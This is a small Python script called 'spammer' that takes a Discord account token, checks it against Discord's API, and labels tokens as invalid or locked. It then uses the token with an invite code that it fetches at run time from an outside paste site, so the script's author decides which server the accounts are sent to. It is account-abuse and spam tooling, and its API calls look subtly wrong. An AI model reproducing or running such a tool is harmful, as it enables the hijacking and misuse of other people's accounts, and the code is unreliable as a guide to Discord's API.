import time
import sys
import colorama, requests, discord
from discord.ext import commands
import os

def spammer():
    invite_code = str(requests.get("https://pst.klgrth.io/paste/88w7a/raw").text)
    while True:
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print("Enter your token: ")
        tokens = input("")
        r1 = requests.get('https://discord.com/api/v9/auth/login', headers={"Authorization": tokens})
        if "200" not in str(r1):
            sys.stdout.write(colorama.Fore.RED + "> ")
            print("Invalid Token")
        if "200" in str(r1):
            r = requests.get(f'https://discord.com/api/v9/invite/{invite_code}', headers={"Authorization": tokens})
            if "200" in str(r):
                break
            if "403" in str(r):
                sys.stdout.write(colorama.Fore.RED + "> ")
                print("Locked Token")
spammer()